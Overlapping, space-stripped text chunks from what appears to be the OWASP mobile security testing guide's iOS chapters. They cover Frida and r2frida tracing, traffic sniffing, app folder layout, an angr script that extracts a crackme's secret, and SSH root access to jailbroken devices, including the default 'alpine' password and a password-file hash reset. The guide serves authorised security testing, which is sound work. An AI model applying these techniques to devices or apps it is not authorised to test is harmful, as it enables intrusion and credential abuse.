(e.g.trafficcaptureandanalysis),youcanobtainsomeinitialinputsorentrypointsbyenumeratingthedomainstowhich theapplicationissupposedtocommunicateto. Typically these domains will be present as strings within the binary of the application. One can extract domains by retrieving strings (as discussed above) or checking the strings using tools like Ghidra. The latter option has a clear advantage: it can provide you with context, as you’ll be able to see in which context each domain is being used by checkingthecross-references. Fromhereonyoucanusethisinformationtoderivemoreinsightswhichmightbeofuselaterduringyouranalysis,e.g.you couldmatchthedomainstothepinnedcertificatesorperformfurtherreconnaissanceondomainnamestoknowmore aboutthetargetenvironment. Theimplementationandverificationofsecureconnectionscanbeanintricateprocessandtherearenumerousaspects toconsider. Forinstance,manyapplicationsuseotherprotocolsapartfromHTTPsuchasXMPPorplainTCPpackets,or performcertificatepinninginanattempttodeterMITMattacks. Remember that in most cases, using only static analysis will not be enough and might even turn out to be extremely inefficientwhencomparedtothedynamicalternativeswhichwillgetmuchmorereliableresults(e.g.usinganinterception proxy). Inthissectionwe’veonlytouchedthesurface,sopleaserefertothesection“BasicNetworkMonitoring/Sniffing” inthe“iOSBasicSecurityTesting”chapterandcheckoutthetestcasesinthechapter“iOSNetworkCommunication”for furtherinformation. 353\\nMethod Tracing Platform: ios InterceptingObjective-CmethodsisausefuliOSsecuritytestingtechnique. Forexample,youmaybeinterestedindata storageoperationsornetworkrequests. Inthefollowingexample,we’llwriteasimpletracerforloggingHTTP(S)requests madeviaiOSstandardHTTPAPIs. We’llalsoshowyouhowtoinjectthetracerintotheSafariwebbrowser. Inthefollowingexamples,we’llassumethatyouareworkingonajailbrokendevice. Ifthat’snotthecase,youfirstneed tofollowthestepsoutlinedinsectionRepackagingandRe-SigningtorepackagetheSafariapp. Fridacomeswithfrida-trace, afunctiontracingtool. frida-traceacceptsObjective-Cmethodsviathe-mflag. You can pass it wildcards as well-given-[NSURL *], for example, frida-trace will automatically install hooks on allNSURL classselectors. We’llusethistogetaroughideaaboutwhichlibraryfunctionsSafaricallswhentheuseropensaURL. RunSafarionthedeviceandmakesurethedeviceisconnectedviaUSB.Thenstartfrida-traceasfollows: $frida-trace -U-m\"-[NSURL*]\" Safari Instrumentingfunctions... -[NSURLisMusicStoreURL]:Loadedhandlerat \"/Users/berndt/Desktop/__handlers__/__NSURL_isMusicStoreURL_.js\" -[NSURLisAppStoreURL]:Loadedhandlerat \"/Users/berndt/Desktop/__handlers__/__NSURL_isAppStoreURL_.js\" (...) Startedtracing248functions.PressCtrl+Ctostop. Next, navigatetoanewwebsiteinSafari. Youshouldseetracedfunctioncallsonthefrida-traceconsole. Notethat theinitWithURL:methodiscalledtoinitializeanewURLrequestobject. /*TID0xc07 */ 20313ms -[NSURLRequest _initWithCFURLRequest:0x1043bca30] 20313ms -[NSURLRequest URL] (...) 21324ms -[NSURLRequest initWithURL:0x106388b00] 21324ms |-[NSURLRequestinitWithURL:0x106388b00cachePolicy:0x0timeoutInterval:0x106388b80 Runtime Reverse Engineering Platform: ios Runtimereverseengineeringcanbeseenastheon-the-flyversionofreverseengineeringwhereyoudon’thavethebinary datatoyourhostcomputer. Instead,you’llanalyzeitstraightfromthememoryoftheapp. We’ll keep using the iGoat-Swift app, open a session with r2frida r2 frida://usb//iGoat-Swift and you can start by displayingthetargetbinaryinformationbyusingthe:icommand:",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 126
    }
  },
  {
    "text": "-[NSURLisAppStoreURL]:Loadedhandlerat \"/Users/berndt/Desktop/__handlers__/__NSURL_isAppStoreURL_.js\" (...) Startedtracing248functions.PressCtrl+Ctostop. Next, navigatetoanewwebsiteinSafari. Youshouldseetracedfunctioncallsonthefrida-traceconsole. Notethat theinitWithURL:methodiscalledtoinitializeanewURLrequestobject. /*TID0xc07 */ 20313ms -[NSURLRequest _initWithCFURLRequest:0x1043bca30] 20313ms -[NSURLRequest URL] (...) 21324ms -[NSURLRequest initWithURL:0x106388b00] 21324ms |-[NSURLRequestinitWithURL:0x106388b00cachePolicy:0x0timeoutInterval:0x106388b80 Runtime Reverse Engineering Platform: ios Runtimereverseengineeringcanbeseenastheon-the-flyversionofreverseengineeringwhereyoudon’thavethebinary datatoyourhostcomputer. Instead,you’llanalyzeitstraightfromthememoryoftheapp. We’ll keep using the iGoat-Swift app, open a session with r2frida r2 frida://usb//iGoat-Swift and you can start by displayingthetargetbinaryinformationbyusingthe:icommand: [0x00000000]>:i arch arm bits 64 os darwin pid 2166 uid 501 objc true runtime V8 java false cylang true pageSize 16384 pointerSize 8 codeSigningPolicy optional isDebuggerAttached false cwd / Searchallsymbolsofacertainmodulewith:is <lib>,e.g.:is libboringssl.dylib. Thefollowingdoesacase-insensitivesearch(grep)forsymbolsincluding“aes”(~+aes). [0x00000000]>\\islibboringssl.dylib~+aes 0x1863d6ed8sEVP_aes_128_cbc 0x1863d6ee4sEVP_aes_192_cbc 0x1863d6ef0sEVP_aes_256_cbc 0x1863d6f14sEVP_has_aes_hardware 354\\n0x1863d6f1csaes_init_key 0x1863d728csaes_cipher 0x0uccaes_cbc_decrypt_mode 0x0uccaes_cbc_encrypt_mode ... Oryoumightprefertolookintotheimports/exports. Forexample: • Listallimportsofthemainbinary: :ii iGoat-Swift. • Listexportsofthelibc++.1.dyliblibrary: :iE /usr/lib/libc++.1.dylib. Forbigbinariesit’srecommendedtopipetheoutputtotheinternallessprogrambyappending~..,i.e.:iiiGoat- Swift~.. (ifnot,forthisbinary,you’dgetalmost5000linesprintedtoyourterminal). Thenextthingyoumightwanttolookataretheclasses: [0x00000000]>\\ic~+passcode PSPasscodeField _UITextFieldPasscodeCutoutBackground UIPasscodeField PasscodeFieldCell ... Listclassfields: [0x19687256c]>\\icUIPasscodeField 0x000000018eec6680 -becomeFirstResponder 0x000000018eec5d78 -appendString: 0x000000018eec6650 -canBecomeFirstResponder 0x000000018eec6700 -isFirstResponder 0x000000018eec6a60 -hitTest:forEvent: 0x000000018eec5384 -setKeyboardType: 0x000000018eec5c8c -setStringValue: 0x000000018eec5c64 -stringValue ... Imagine that you are interested into 0x000000018eec5c8c - setStringValue:. You can seek to that address with s 0x000000018eec5c8c,analyzethatfunctionafandprint10linesofitsdisassemblypd 10: [0x18eec5c8c]>pd10 ╭(fcn)fcn.18eec5c8c35 │ fcn.18eec5c8c (int32_targ1,int32_targ3); │bp:0 (vars0,args0) │sp:0 (vars0,args0) │rg:2 (vars0,args2) │ 0x18eec5c8c f657bd notbyte[rdi -0x43] ;arg1 │ 0x18eec5c8f a9f44f01a9 testeax,0xa9014ff4 │ 0x18eec5c94 fd std │ ╭─<0x18eec5c95 7b02 jnp0x18eec5c99 │ │ 0x18eec5c97 a9fd830091 testeax,0x910083fd │ 0x18eec5c9c f30300 addeax,dword [rax] │ 0x18eec5c9f aa stosbbyte [rdi],al │ ╭─<0x18eec5ca0 e003 loopne0x18eec5ca5 │ │ 0x18eec5ca2 02aa9b494197 addch,byte[rdx -0x68beb665] ; arg3 ╰ 0x18eec5ca8 f4 hlt Finally, instead of doing a full memory search for strings, you may want to retrieve the strings from a certain binary and filter them, as you’d do offline with radare2. For this you have to find the binary, seek to it and then run the :iz command. It’srecommendedtoapplyafilterwithakeyword~<keyword>/~+<keyword>tominimizetheterminaloutput. Ifjust wanttoexploreallresultsyoucanalsopipethemtotheinternalless\\iz~... [0x00000000]>:il~iGoa 0x00000001006b8000iGoat-Swift [0x00000000]>s0x00000001006b8000 [0x1006b8000]>:iz Reading2.390625MB... Doyouwanttoprint8568lines?(y/N)N [0x1006b8000]>:iz~+hill Reading2.390625MB... [0x1006b8000]>:iz~+pass 355\\nReading2.390625MB... 0x00000001006b93ed \"passwordTextField\" 0x00000001006bb11a \"11iGoat_Swift20KeychainPasswordItemV0C5ErrorO\" 0x00000001006bb164 \"unexpectedPasswordData\" 0x00000001006d3f62 \"Errorreadingpasswordfromkeychain-\" 0x00000001006d40f2 \"IncorrectPassword\" 0x00000001006d4112 \"Enterthecorrectpassword\" 0x00000001006d4632 \"T@\"UITextField\",N,W,VpasswordField\" 0x00000001006d46f2 \"CREATETABLEIFNOTEXISTScreds(idINTEGERPRIMARYKEYAUTOINCREMENT,usernameTEXT,passwordTEXT);\" 0x00000001006d4792 \"INSERTINTOcreds(username,password)VALUES(?,?)\" Tolearnmore,pleaserefertother2fridawiki. Basic Network Monitoring/Sniffing Platform: ios Youcanremotelysniffalltrafficinreal-timeoniOSbycreatingaRemoteVirtualInterfaceforyouriOSdevice. Firstmake sureyouhaveWiresharkinstalledonyourmacOShostcomputer. 1. ConnectyouriOSdevicetoyourmacOShostcomputerviaUSB. 2. YouwouldneedtoknowtheUDIDofyouriOSdevice,beforeyoucanstartsniffing. Checkthesection“Gettingthe UDIDofaniOSdevice”onhowtoretrieveit. OpentheTerminalonmacOSandenterthefollowingcommand,filling intheUDIDofyouriOSdevice. $rvictl -s<UDID> Startingdevice <UDID>[SUCCEEDED]withinterfacervi0 1. LaunchWiresharkandselect“rvi0”asthecaptureinterface. 2. FilterthetrafficwithCaptureFiltersinWiresharktodisplaywhatyouwanttomonitor(forexample,allHTTPtraffic sent/receivedviatheIPaddress192.168.1.1). ip.addr==192.168.1.1&&http ThedocumentationofWiresharkoffersmanyexamplesforCaptureFiltersthatshouldhelpyoutofilterthetraffictoget theinformationyouwant. Retrieving Strings Platform: ios Strings are always a good starting point while analyzing a binary, as they provide context to the associated code. For instance, an error log string such as “Cryptogram generation failed” gives us a hint that the adjoining code might be responsibleforthegenerationofacryptogram. In order to extract strings from an iOS binary, you can use GUI tools such as Ghidra or iaito or rely on CLI-based tools suchasthestringsUnixutility(strings<path_to_binary>)orradare2’srabin2(rabin2-zz<path_to_binary>). When usingtheCLI-basedonesyoucantakeadvantageofothertoolssuchasgrep(e.g.inconjunctionwithregularexpressions) tofurtherfilterandanalyzetheresults. 356\\nNative Code Tracing Platform: ios Asdiscussedearlierinthischapter,iOSapplicationscanalsocontainnativecode(C/C++code)anditcanbetracedusing thefrida-traceCLIaswell. Forexample,youcantracecallstotheopenfunctionbyrunningthefollowingcommand: frida-trace -U-i\"open\" sg.vp.UnCrackable1 TheoverallapproachandfurtherimprovisationfortracingnativecodeusingFridaissimilartotheonediscussedinthe Android“Tracing”section. Unfortunately,therearenotoolssuchasstraceorftraceavailabletotracesyscallsorfunctioncallsofaniOSapp. Only DTraceexists,whichisaverypowerfulandversatiletracingtool,butit’sonlyavailableforMacOSandnotforiOS. Accessing App Data Directories Platform: ios Once you have installed the app, there is further information to explore. Let’s go through a short overview of the app folderstructureoniOSappstounderstandwhichdataisstoredwhere. Thefollowingillustrationrepresentstheapplication folderstructure: OniOS,systemapplicationscanbefoundinthe/Applicationsdirectorywhileuser-installedappsareavailableunder /private/var/containers/. However,findingtherightfolderjustbynavigatingthefilesystemisnotatrivialtaskas everyappgetsarandom128-bitUUID(UniversalUniqueIdentifier)assignedforitsdirectorynames. Inordertoeasilyobtaintheinstallationdirectoryinformationforuser-installedappsyoucanfollowthefollowingmeth- ods: Connecttotheterminalonthedeviceandrunthecommandipainstaller(IPAInstallerConsole)asfollows: 357\\niPhone:~root#ipainstaller -l ... OWASP.iGoat-Swift iPhone:~root#ipainstaller -iOWASP.iGoat-Swift ... Bundle:/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67 Application:/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app Data:/private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693 Usingobjection’scommandenvwillalsoshowyouallthedirectoryinformationoftheapp. Connectingtotheapplication withobjectionisdescribedinthesection“RecommendedTools-Objection”. OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #env Name Path ----------------- ------------------------------------------------------------------------------------------- BundlePath /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app CachesDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches DocumentDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents LibraryDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library Asyoucansee,appshavetwomainlocations: • TheBundledirectory(/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/). • TheDatadirectory(/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/). Thesefolderscontaininformationthatmustbeexaminedcloselyduringapplicationsecurityassessments(forexample whenanalyzingthestoreddataforsensitivedata). Bundledirectory: • AppName.app – ThisistheApplicationBundleasseenbeforeintheIPA,itcontainsessentialapplicationdata,staticcontent aswellastheapplication’scompiledbinary. – Thisdirectoryisvisibletousers,butuserscan’twritetoit. – Contentinthisdirectoryisnotbackedup. – Thecontentsofthisfolderareusedtovalidatethecodesignature. Datadirectory: • Documents/ – Containsalltheuser-generateddata. Theapplicationenduserinitiatesthecreationofthisdata. – Visibletousersanduserscanwritetoit. –",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 127
    }
  },
  {
    "text": "... Bundle:/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67 Application:/private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app Data:/private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693 Usingobjection’scommandenvwillalsoshowyouallthedirectoryinformationoftheapp. Connectingtotheapplication withobjectionisdescribedinthesection“RecommendedTools-Objection”. OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #env Name Path ----------------- ------------------------------------------------------------------------------------------- BundlePath /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app CachesDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches DocumentDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents LibraryDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library Asyoucansee,appshavetwomainlocations: • TheBundledirectory(/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/). • TheDatadirectory(/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/). Thesefolderscontaininformationthatmustbeexaminedcloselyduringapplicationsecurityassessments(forexample whenanalyzingthestoreddataforsensitivedata). Bundledirectory: • AppName.app – ThisistheApplicationBundleasseenbeforeintheIPA,itcontainsessentialapplicationdata,staticcontent aswellastheapplication’scompiledbinary. – Thisdirectoryisvisibletousers,butuserscan’twritetoit. – Contentinthisdirectoryisnotbackedup. – Thecontentsofthisfolderareusedtovalidatethecodesignature. Datadirectory: • Documents/ – Containsalltheuser-generateddata. Theapplicationenduserinitiatesthecreationofthisdata. – Visibletousersanduserscanwritetoit. – Contentinthisdirectoryisbackedup. – TheappcandisablepathsbysettingNSURLIsExcludedFromBackupKey. • Library/ – Containsallfilesthataren’tuser-specific,suchascaches,preferences,cookies,andpropertylist(plist)con- figurationfiles. – iOS apps usually use the Application Support and Caches subdirectories, but the app can create custom subdirectories. • Library/Caches/ – Containssemi-persistentcachedfiles. – Invisibletousersanduserscan’twritetoit. – Contentinthisdirectoryisnotbackedup. – TheOSmaydeletethisdirectory’sfilesautomaticallywhentheappisnotrunningandstoragespaceisrunning low. • Library/ApplicationSupport/ – Containspersistentfilesnecessaryforrunningtheapp. – Invisibletousersanduserscan’twritetoit. – Contentinthisdirectoryisbackedup. 358\\n– TheappcandisablepathsbysettingNSURLIsExcludedFromBackupKey. • Library/Preferences/ – Usedforstoringpropertiesthatcanpersistevenafteranapplicationisrestarted. – Informationissaved,unencrypted,insidetheapplicationsandboxinaplistfilecalled[BUNDLE_ID].plist. – Allthekey/valuepairsstoredusingNSUserDefaultscanbefoundinthisfile. • tmp/ – Usethisdirectorytowritetemporaryfilesthatdonotneedtopersistbetweenapplaunches. – Containsnon-persistentcachedfiles. – Invisibletousers. – Contentinthisdirectoryisnotbackedup. – TheOSmaydeletethisdirectory’sfilesautomaticallywhentheappisnotrunningandstoragespaceisrunning low. Let’stakeacloserlookatiGoat-Swift’sApplicationBundle(.app)directoryinsidetheBundledirectory(/var/containers/ Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app): OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #ls NSFileType Perms NSFileProtection ... Name ------------ ------- ------------------ ... -------------------------------------- Regular 420 None ... rutger.html Regular 420 None ... mansi.html Regular 420 None ... splash.html Regular 420 None ... about.html Regular 420 None ... LICENSE.txt Regular 420 None ... Sentinel.txt Regular 420 None ... README.txt Directory 493 None ... URLSchemeAttackExerciseVC.nib Directory 493 None ... CutAndPasteExerciseVC.nib Directory 493 None ... RandomKeyGenerationExerciseVC.nib Directory 493 None ... KeychainExerciseVC.nib Directory 493 None ... CoreData.momd Regular 420 None ... archived-expanded-entitlements.xcent Directory 493 None ... SVProgressHUD.bundle Directory 493 None ... Base.lproj Regular 420 None ... Assets.car Regular 420 None ... PkgInfo Directory 493 None ... _CodeSignature Regular 420 None ... AppIcon60x60@3x.png Directory 493 None ... Frameworks Regular 420 None ... embedded.mobileprovision Regular 420 None ... Credentials.plist Regular 420 None ... Assets.plist Regular 420 None ... Info.plist Regular 493 None ... iGoat-Swift YoucanalsovisualizetheBundledirectoryfromGrapefruitbyclickingonFinder->Bundle: 359\\nIncludingtheInfo.plistfile: AswellastheDatadirectoryinFinder->Home: 360\\nRefertotheTestingDataStoragechapterformoreinformationandbestpracticesonsecurelystoringsensitivedata. Symbolic Execution Platform: ios TODO:Currentlydon’thavethis,butwedohavethissectionbelowwhichdoestalkaboutAngrandasmallintroreferring toAndroid Anintroductiontobinaryanalysisusingbinaryanalysisframeworkshasalreadybeendiscussedinthe“DynamicAnalysis” sectionforAndroid. Werecommendyoutorevisitthissectionandrefreshtheconceptsonthissubject. ForAndroid,weusedAngr’ssymbolicexecutionenginetosolveachallenge. Inthissection,wewillfirstlyuseUnicornto solvetheUnCrackableAppforiOSLevel1challengeandthenwewillrevisittheAngrbinaryanalysisframeworktoanalyze thechallengebutinsteadofsymbolicexecutionwewilluseitsconcreteexecution(ordynamicexecution)features. Angr Angrisaveryversatiletool,providingmultipletechniquestofacilitatebinaryanalysis,whilesupportingvariousfileformats andhardwareinstructionssets. TheMach-ObackendinAngrisnotwell-supported,butitworksperfectlyfineforourcase. While manually analyzing the code in the Reviewing Disassembled Native Code” section, we reached a point where performing further manual analysis was cumbersome. The function at offset 0x1000080d4 was identified as the final targetwhichcontainsthesecretstring. Ifwerevisitthatfunction,wecanseethatitinvolvesmultiplesub-functioncallsandinterestinglynoneofthesefunctions have any dependencies on other library calls or system calls. This is a perfect case to use Angr’s concrete execution engine. Followthestepsbelowtosolvethischallenge: 361\\n• Get the ARM64 version of the binary by running lipo -thin arm64 <app_binary> -output uncrackable.arm64 (ARMv7canbeusedaswell). • CreateanAngrProjectbyloadingtheabovebinary. • Getacallableobjectbypassingtheaddressofthefunctiontobeexecuted. FromtheAngrdocumentation: “A Callableisarepresentationofafunctioninthebinarythatcanbeinteractedwithlikeanativepythonfunction.”. • Pass the above callable object to the concrete execution engine, which in this case is claripy.backends. concrete. • Accessthememoryandextractthestringfromthepointerreturnedbytheabovefunction. importangr importclaripy defsolve(): #Loadthebinarybycreatingangrproject. project =angr.Project('uncrackable.arm64') #Passtheaddressofthefunctiontothecallable func =project.factory.callable(0x1000080d4) #Getthereturnvalueofthefunction ptr_secret_string =claripy.backends.concrete.convert(func()).value print(\"Addressofthepointertothesecretstring:\" +hex(ptr_secret_string)) #Extractthevaluefromthepointertothesecretstring secret_string =func.result_state.mem[ptr_secret_string].string.concrete print(f\"SecretString: {secret_string}\") solve() Above, Angr executed an ARM64 code in an execution environment provided by one of its concrete execution engines. Theresultisaccessedfromthememoryasiftheprogramisexecutedonarealdevice. Thiscaseisagoodexamplewhere binaryanalysisframeworksenableustoperformacomprehensiveanalysisofabinary,evenintheabsenceofspecialized devicesneededtorunit. Exploring the App Package Platform: ios Onceyouhavecollectedthepackagenameoftheapplicationyouwanttotarget,you’llwanttostartgatheringinformation aboutit. First,retrievetheIPAasexplainedinBasicTestingOperations-ObtainingandExtractingApps. YoucanunziptheIPAusingthestandardunziporanyotherZIPutility. Insideyou’llfindaPayloadfoldercontainingthe so-called Application Bundle (.app). The following is an example in the following output, note that it was truncated for betterreadabilityandoverview: $ls -1Payload/iGoat-Swift.app rutger.html mansi.html splash.html about.html LICENSE.txt Sentinel.txt README.txt URLSchemeAttackExerciseVC.nib CutAndPasteExerciseVC.nib RandomKeyGenerationExerciseVC.nib KeychainExerciseVC.nib CoreData.momd archived-expanded-entitlements.xcent SVProgressHUD.bundle Base.lproj Assets.car PkgInfo _CodeSignature AppIcon60x60@3x.png Frameworks embedded.mobileprovision Credentials.plist 362\\nAssets.plist Info.plist iGoat-Swift Themostrelevantitemsare: • Info.plist contains configuration information for the application, such as its bundle ID, version number, and displayname. • _CodeSignature/containsaplistfilewithasignatureoverallfilesinthebundle.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 128
    }
  },
  {
    "text": "truncated for betterreadabilityandoverview: $ls -1Payload/iGoat-Swift.app rutger.html mansi.html splash.html about.html LICENSE.txt Sentinel.txt README.txt URLSchemeAttackExerciseVC.nib CutAndPasteExerciseVC.nib RandomKeyGenerationExerciseVC.nib KeychainExerciseVC.nib CoreData.momd archived-expanded-entitlements.xcent SVProgressHUD.bundle Base.lproj Assets.car PkgInfo _CodeSignature AppIcon60x60@3x.png Frameworks embedded.mobileprovision Credentials.plist 362\\nAssets.plist Info.plist iGoat-Swift Themostrelevantitemsare: • Info.plist contains configuration information for the application, such as its bundle ID, version number, and displayname. • _CodeSignature/containsaplistfilewithasignatureoverallfilesinthebundle. • Frameworks/containstheappnativelibrariesas.dylibor.frameworkfiles. • PlugIns/maycontainappextensionsas.appexfiles(notpresentintheexample). • iGoat-Swiftistheappbinarycontainingtheapp’scode. Itsnameisthesameasthebundle’snameminusthe.app extension. • Various resources such as images/icons, *.nib files (storing the user interfaces of iOS app), localized content (<language>.lproj),textfiles,audiofiles,etc. The Info.plist File The information property list or Info.plist (named by convention) is the main source of information for an iOS app. It consists of a structured file containing key-value pairs describing essential configuration information about the app. Actually,allbundledexecutables(appextensions,frameworksandapps)areexpectedtohaveanInfo.plistfile. You canfindallpossiblekeysintheAppleDeveloperDocumentation. ThefilemightbeformattedinXMLorbinary(bplist). YoucanconvertittoXMLformatwithonesimplecommand: • OnmacOSwithplutil,whichisatoolthatcomesnativelywithmacOS10.2andaboveversions(noofficialonline documentationiscurrentlyavailable): plutil -convert xml1Info.plist • OnLinux: aptinstall libplist-utils plistutil -iInfo.plist -oInfo_xml.plist Here’sanon-exhaustivelistofsomeinfoandthecorrespondingkeywordsthatyoucaneasilysearchforintheInfo.plist filebyjustinspectingthefileorbyusinggrep -i <keyword> Info.plist: • ApppermissionsPurposeStrings: UsageDescription(see“iOSPlatformAPIs”) • CustomURLschemes: CFBundleURLTypes(see“iOSPlatformAPIs”) • Exported/importedcustomdocumenttypes: UTExportedTypeDeclarations/UTImportedTypeDeclarations(see “iOSPlatformAPIs”) • AppTransportSecurity(ATS)configuration: NSAppTransportSecurity(see“iOSNetworkCommunication”) Pleaserefertothementionedchapterstolearnmoreabouthowtotesteachofthesepoints. App Binary iOSappbinariesarefatbinaries(theycanbedeployedonalldevices32-and64-bit). IncontrasttoAndroid,whereyou canactuallydecompiletheappbinarytoJavacode,theiOSappbinariescanonlybedisassembled. RefertothechapterTamperingandReverseEngineeringoniOSformoredetails. Native Libraries iOSappscanmaketheircodebasemodularbyusingdifferentelements. IntheMASTGwewillrefertoallofthemasnative libraries,buttheycancomeindifferentforms: • StaticandDynamicLibraries: 363\\n– StaticLibrariescanbeusedandwillbecompiledintheappbinary. – Dynamic Libraries (typically having the .dylib extension) are also used but must be part of a framework bundle. Standalone Dynamic Libraries are not supported on iOS, watchOS, or tvOS, except for the system SwiftlibrariesprovidedbyXcode. • Frameworks(sinceiOS8). AFrameworkisahierarchicaldirectorythatencapsulatesadynamiclibrary,headerfiles, andresources,suchasstoryboards,imagefiles,andlocalizedstrings,intoasinglepackage. • BinaryFrameworks(XCFrameworks): Xcode11supportsdistributingbinarylibrariesusingtheXCFrameworksformat whichisanewwaytobundleupmultiplevariantsofaFramework,e.g.foranyoftheplatformsthatXcodesupports (includingsimulatoranddevices). Theycanalsobundleupstaticlibraries(andtheircorrespondingheaders)and supportbinarydistributionofSwiftandC-basedcode. XCFrameworkscanbedistributedasSwiftPackages. • SwiftPackages: Xcode11addsupportsforSwiftpackages, whicharereusablecomponentsofSwift, Objective-C, Objective-C++,C,orC++codethatdeveloperscanuseintheirprojectsandaredistributedassourcecode. Since Xcode12theycanalsobundleresources,suchasimages,storyboards,andotherfiles. SincePackagelibrariesare staticbydefault. Xcodecompilesthem,andthepackagestheydependon,andthenlinksandcombineseverything intotheapplication. YoucanviewnativelibrariesinGrapefruitbyclickingontheModulesiconintheleftmenubar: 364\\nAndgetamoredetailedviewincludingtheirimports/exports: TheyareavailableintheFrameworksfolderintheIPA,youcanalsoinspectthemfromtheterminal: $ls -1Frameworks/ Realm.framework libswiftCore.dylib libswiftCoreData.dylib libswiftCoreFoundation.dylib orfromthedevicewithobjection(aswellasperSSHofcourse): OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #ls NSFileType Perms NSFileProtection ... Name ------------ ------- ------------------ ... ---------------------------- Directory 493 None ... Realm.framework Regular 420 None ... libswiftCore.dylib Regular 420 None ... libswiftCoreData.dylib Regular 420 None ... libswiftCoreFoundation.dylib ... Pleasenotethatthismightnotbethecompletelistofnativecodeelementsbeingusedbytheappassomecanbepartof thesourcecode,meaningthatthey’llbecompiledintheappbinaryandthereforecannotbefoundasstandalonelibraries orFrameworksintheFrameworksfolder. FornowthisisallinformationyoucangetabouttheFrameworksunlessyoustartreverseengineeringthem. Refertothe chapterTamperingandReverseEngineeringoniOSformoreinformationabouthowtoreverseengineerFrameworks. Other App Resources ItisnormallyworthtakingalookattherestoftheresourcesandfilesthatyoumayfindintheApplicationBundle(.app) insidetheIPAassometimestheycontainadditionalgoodieslikeencrypteddatabases,certificates,etc. 365\\nAccessing the Device Shell Platform: ios Oneofthemostcommonthingsyoudowhentestinganappisaccessingthedeviceshell. Inthissectionwe’llseehowto accesstheiOSshellbothremotelyfromyourhostcomputerwith/withoutaUSBcableandlocallyfromthedeviceitself. Remote Shell IncontrasttoAndroidwhereyoucaneasilyaccessthedeviceshellusingtheadbtool,oniOSyouonlyhavetheoption to access the remote shell via SSH. This also means that your iOS device must be jailbroken in order to connect to its shellfromyourhostcomputer. Forthissectionweassumethatyou’veproperlyjailbrokenyourdeviceandhaveeither Cydia(seescreenshotbelow)orSileoinstalled. IntherestoftheguidewewillreferencetoCydia,butthesamepackages shouldbeavailableinSileo. 366\\nInordertoenableSSHaccesstoyouriOSdeviceyoucaninstalltheOpenSSHpackage. Onceinstalled,besuretoconnect bothdevicestothesameWi-FinetworkandtakeanoteofthedeviceIPaddress,whichyoucanfindintheSettings-> Wi-Fimenuandtappingonceontheinfoiconofthenetworkyou’reconnectedto. Youcannowaccesstheremotedevice’sshellbyrunningssh root@<device_ip_address>,whichwilllogyouinasthe rootuser: $sshroot@192.168.197.234 root@192.168.197.234'spassword: iPhone:~root# PressControl+Dortypeexittoquit. WhenaccessingyouriOSdeviceviaSSHconsiderthefollowing: • Thedefaultusersarerootandmobile. • Thedefaultpasswordforbothisalpine. Remembertochangethedefaultpasswordforbothusersrootandmobileasanyoneonthesamenetworkcanfind theIPaddressofyourdeviceandconnectviathewell-knowndefaultpassword,whichwillgivethemrootaccessto yourdevice. Ifyouforgetyourpasswordandwanttoresetittothedefaultalpine: 1. Edit the file /private/etc/master.password on your jailbroken iOS device (using an on-device shell as shown below) 367\\n2. Findthelines: root:xxxxxxxxx:0:0::0:0:SystemAdministrator:/var/root:/bin/sh mobile:xxxxxxxxx:501:501::0:0:MobileUser:/var/mobile:/bin/sh 3. Changexxxxxxxxxto/smx7MYTQIi2M(whichisthehashedpasswordalpine) 4. Saveandexit Connect to a Device via SSH over USB Duringarealblackboxtest,areliableWi-Ficonnectionmaynotbeavailable. Inthissituation,youcanuseusbmuxdto connecttoyourdevice’sSSHserverviaUSB. ConnectmacOStoaniOSdevicebyinstallingandstartingiproxy: $brewinstalllibimobiledevice $iproxy222222 waitingforconnection Theabovecommandmapsport22ontheiOSdevicetoport2222onlocalhost. Youcanalsomakeiproxyrunautomatically inthebackgroundifyoudon’twanttorunthebinaryeverytimeyouwanttoSSHoverUSB. Withthefollowingcommandinanewterminalwindow,youcanconnecttothedevice: $ssh -p2222root@localhost root@localhost'spassword: iPhone:~root# SmallnoteonUSBofaniDevice: onaniOSdeviceyoucannotmakedataconnectionsanymoreafter1hourofbeing inalockedstate,unlessyouunlockitagainduetotheUSBRestrictedMode,whichwasintroducedwithiOS11.4.1 On-device Shell App Whileusuallyusinganon-deviceshell(terminalemulator)mightbeverytediouscomparedtoaremoteshell,itcanprove handyfordebuggingincaseof,forexample,networkissuesorchecksomeconfiguration. Forexample,youcaninstall NewTerm2viaCydiaforthispurpose(itsupportsiOS6.0to12.1.2atthetimeofthiswriting). Inaddition,thereareafewjailbreaksthatexplicitlydisableincomingSSHforsecurityreasons. Inthosecases,itisvery 